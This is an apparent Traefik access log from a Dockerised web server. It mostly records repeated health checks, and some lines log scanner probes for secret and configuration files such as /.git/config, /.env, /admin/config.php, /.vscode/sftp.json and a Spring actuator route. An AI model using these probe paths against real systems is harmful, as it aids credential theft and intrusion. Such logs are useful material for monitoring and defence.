159.203.109.206 - - [18/Dec/2023:22:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6764 "www@docker" "http://172.18.0.9:80" 0ms
170.64.186.169 - - [18/Dec/2023:22:09:24 +0000] "GET /.git/config HTTP/1.1" 301 17 "-" "-" 6765 "web-to-websecure@internal" "-" 0ms
170.64.186.169 - - [18/Dec/2023:22:09:24 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 6766 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:22:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6767 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6768 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6769 "www@docker" "http://172.18.0.9:80" 1ms
45.79.181.251 - - [18/Dec/2023:22:10:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6770 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:22:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6771 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:22:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6772 "www@docker" "http://172.18.0.9:80" 1ms
45.79.181.251 - - [18/Dec/2023:22:11:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6773 "-" "-" 0ms
83.97.73.87 - - [18/Dec/2023:22:12:10 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 6774 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:22:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6775 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:22:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6776 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6777 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6778 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6779 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6780 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6781 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:22:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6782 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6783 "www@docker" "http://172.18.0.9:80" 0ms
20.55.53.144 - - [18/Dec/2023:22:16:27 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6784 "-" "-" 0ms
20.55.53.144 - - [18/Dec/2023:22:16:29 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6785 "web-to-websecure@internal" "-" 0ms
20.55.53.144 - - [18/Dec/2023:22:16:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6786 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:22:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6787 "www@docker" "http://172.18.0.9:80" 1ms
2.56.247.167 - - [18/Dec/2023:22:17:04 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6788 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:22:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6789 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:22:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6790 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6791 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6792 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6793 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6794 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6795 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:22:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6796 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6797 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6798 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6799 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6800 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6801 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6802 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6803 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6804 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6805 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:22:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6806 "www@docker" "http://172.18.0.9:80" 1ms
54.36.115.221 - - [18/Dec/2023:22:25:39 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 6807 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [18/Dec/2023:22:25:39 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 6808 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:22:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6809 "www@docker" "http://172.18.0.9:80" 1ms
20.55.53.144 - - [18/Dec/2023:22:26:32 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6810 "web-to-websecure@internal" "-" 0ms
20.55.53.144 - - [18/Dec/2023:22:26:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6811 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:22:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6812 "www@docker" "http://172.18.0.9:80" 0ms
20.55.53.144 - - [18/Dec/2023:22:26:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6813 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:22:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6814 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6815 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6816 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6817 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6818 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:22:29:24 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6819 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:22:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6820 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6821 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:22:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6822 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6823 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6824 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6825 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:22:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6826 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [18/Dec/2023:22:33:16 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 6827 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [18/Dec/2023:22:33:16 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 6828 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:22:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6829 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6830 "www@docker" "http://172.18.0.9:80" 1ms
34.140.248.32 - - [18/Dec/2023:22:33:55 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6831 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:22:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6832 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:22:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6833 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6834 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:22:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6835 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6836 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:22:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6837 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6838 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6839 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6840 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6841 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6842 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6843 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6844 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6845 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6846 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6847 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6848 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6849 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6850 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6851 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6852 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6853 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6854 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6855 "www@docker" "http://172.18.0.9:80" 0ms
51.254.49.105 - - [18/Dec/2023:22:46:14 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6856 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:22:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6857 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6858 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6859 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6860 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6861 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:22:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6862 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6863 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6864 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6865 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6866 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6867 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6868 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6869 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6870 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6871 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6872 "www@docker" "http://172.18.0.9:80" 0ms
78.153.140.224 - - [18/Dec/2023:22:54:14 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6873 "-" "-" 0ms
78.153.140.224 - - [18/Dec/2023:22:54:14 +0000] "GET /admin/config.php HTTP/1.1" 404 19 "-" "-" 6874 "-" "-" 0ms
78.153.140.224 - - [18/Dec/2023:22:54:15 +0000] "GET /admin/config.php HTTP/1.1" 404 19 "-" "-" 6875 "-" "-" 0ms
78.153.140.224 - - [18/Dec/2023:22:54:15 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6876 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:22:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6877 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6878 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6879 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6880 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6881 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:22:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6882 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6883 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6884 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:22:57:48 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6885 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:22:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6886 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6887 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6888 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6889 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6890 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6891 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6892 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:23:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6893 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6894 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:23:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6895 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6896 "www@docker" "http://172.18.0.9:80" 0ms
45.33.87.154 - - [18/Dec/2023:23:03:34 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6897 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:23:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6898 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6899 "www@docker" "http://172.18.0.9:80" 1ms
193.111.248.5 - - [18/Dec/2023:23:04:24 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 6900 "web-to-websecure@internal" "-" 0ms
172.104.11.46 - - [18/Dec/2023:23:04:25 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6901 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:23:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6902 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6903 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6904 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6905 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6906 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6907 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:23:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6908 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6909 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6910 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6911 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:23:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6912 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6913 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6914 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6915 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6916 "www@docker" "http://172.18.0.9:80" 1ms
1.234.83.58 - - [18/Dec/2023:23:12:09 +0000] "HEAD /.vscode/sftp.json HTTP/1.1" 308 18 "-" "-" 6917 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:23:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6918 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6919 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6920 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6921 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6922 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:23:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6923 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6924 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6925 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6926 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:23:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6927 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6928 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:23:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6929 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6930 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6931 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:23:18:58 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6932 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:23:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6933 "www@docker" "http://172.18.0.9:80" 0ms
78.153.140.219 - - [18/Dec/2023:23:19:31 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 6934 "web-to-websecure@internal" "-" 0ms
78.153.140.219 - - [18/Dec/2023:23:19:31 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 6935 "-" "-" 0ms
78.153.140.219 - - [18/Dec/2023:23:19:31 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 6936 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:23:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6937 "www@docker" "http://172.18.0.9:80" 0ms
192.155.88.231 - - [18/Dec/2023:23:20:00 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6938 "-" "-" 0ms
45.79.172.21 - - [18/Dec/2023:23:20:13 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6939 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:23:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6940 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6941 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6942 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6943 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6944 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6945 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6946 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6947 "www@docker" "http://172.18.0.9:80" 1ms
205.210.31.100 - - [18/Dec/2023:23:24:06 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6948 "web-to-websecure@internal" "-" 0ms
205.210.31.100 - - [18/Dec/2023:23:24:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6949 "-" "-" 0ms
